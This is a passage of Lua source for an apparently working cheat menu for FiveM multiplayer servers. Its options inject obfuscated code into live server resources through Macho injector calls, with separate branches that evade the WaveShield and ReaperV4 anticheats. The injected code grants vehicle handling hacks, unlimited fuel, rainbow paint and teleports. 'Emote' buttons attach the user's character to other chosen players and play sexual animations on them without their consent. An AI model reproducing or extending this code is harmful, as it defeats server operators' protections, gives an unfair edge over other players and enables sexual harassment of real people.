                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Easy Handling On (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Easy Handling Off", 3000)
                                        MachoInjectResourceRaw("WaveShield", [[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Easy Handling Off (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Rainbow Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                local target = GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any"
                                if checked then
                                    OSINT:Notify("success", "OSINT", "Rainbow Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        print("souygdfg")
                                        Injection(target, [[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]])
                                    else
                                        Injection(target, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]])
                                    end
                                else
                                    OSINT:Notify("error", "OSINT", "Rainbow Vehicle Off", 3000)
                                    if GetResourceState("WaveShield") == "started" then
                                        print("swave")
                                        Injection(target, [[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]])
                                    else
                                        Injection(target, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]])
                                    end
                                end
                            end,
                        },
                        { type = "checkbox", label = "Unlimited Fuel", checked = false,
                            onSelect = function(checked)
                                if checked then
                                OSINT:Notify("success", "OSINT", "Unlimited Fuel On", 3000)
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]])
                                else
                                OSINT:Notify("error", "OSINT", "Unlimited Fuel Off", 3000)
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]])
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Emotes",
            type = "subMenu",
            categories = {
                {
                    label = "Emote Menu",
                    tabs = {
                        { type = "button", label = "Detach All Entitys",
                            onSelect = function()
                                print("dih")
                            MachoInjectResourceRaw("any", [[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
                            ]])
                            end
                        },
                        { type = "divider", label = "Emotes" },
                        {
                            type = "button",
                            label = "Twerk On Them",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player first!", 3000)
                                    return
                                end

                                for _, playerId in ipairs(targetPlayers) do
                                    MachoInjectResourceRaw("any", string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]], playerId, playerId))
                                end

                                self:Notify("success", "OSINT", "Attempted to twerk on " .. #targetPlayers .. " player(s).", 4000)
                            end
                        },
                        { type = "divider", label = "Vehicle Emotes" },
                        {
                            type = "button",
                            label = "Blow Driver",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player first!", 3000)
                                    return
                                end

                                for _, playerId in ipairs(targetPlayers) do
                                    MachoInjectResourceRaw("any", string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]], playerId, playerId))
                                end

                                self:Notify("success", "OSINT", "Attempted BlowDriver on " .. #targetPlayers .. " player(s).", 4000)
                            end
                        },
                    }
                },
            }
        },

        {
            icon = "",
            label = "Teleports",
            type = "subMenu",
            categories = {
                {
                    label = "Teleport Menu",
                    tabs = {
                        { type = "button", label = "FIB Building",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'
                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]])
                        elseif
                        ReaperStart then
                            MachoInjectThread(0, "any", "", [[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]])
                        else
                            MachoInjectResourceRaw("any", [[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]])                            
                            end
                        end
                        },
                        { type = "button", label = "Mission Row PD",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'

                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]])
                        elseif
                        ReaperStart then
                        MachoInjectThread(0, "any", "", [[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]])                            
                        else
                            MachoInjectResourceRaw("any", [[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]])
                            end
                        end
                        },
                        { type = "button", label = "Pillbox Hospital",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'

                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]])
                        elseif
                        ReaperStart then
                        MachoInjectThread(0, "any", "", [[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]])                             
                        else
                            MachoInjectResourceRaw("any", [[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]])                            
                            end
                        end
                        },
                        { type = "button", label = "Grove Street",
                        onSelect = function()
                        local waveShieldStart = GetResourceState("WaveShield") == 'started'
                        local ReaperStart = GetResourceState("ReaperV4") == 'started'

                        if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]])
                        elseif
                        ReaperStart then
                        MachoInjectThread(0, "any", "", [[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]])                        
                        else
                            MachoInjectResourceRaw("any", [[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]])                            
                            end
                        end
                        },
                        { type = "button", label = "Legion Square",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'

                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]])
                        elseif
                        ReaperStart then
                            MachoInjectThread(0, "any", "", [[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]])                            
                        else
                            MachoInjectResourceRaw("any", [[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]])                            
                            end
                        end
                        },
                    }
                },
            }
        },

        {
            icon = "",
            label = "Settings",
            type = "subMenu",
            categories = {
                {
                    label = "Interface",
                    tabs = {
                        { type = "subMenu", label = "Keybinds",
                            subTabs = {
                                { icon = "", type = "button", label = "Menu Key",
                                    onSelect = function()
                                        KeyboardInput("Choose Menu Key", "", function(val)
                                            for vk, name in pairs(MappedKeys) do
                                                if name:lower() == val:lower() then
                                                    MenuKey = name
                                                    Wait(250)
                                                    OSINT:ShowUI()
                                                    return
                                                end
                                            end
                                        end, "keybind")
                                    end 
                                },
                            }
                        },
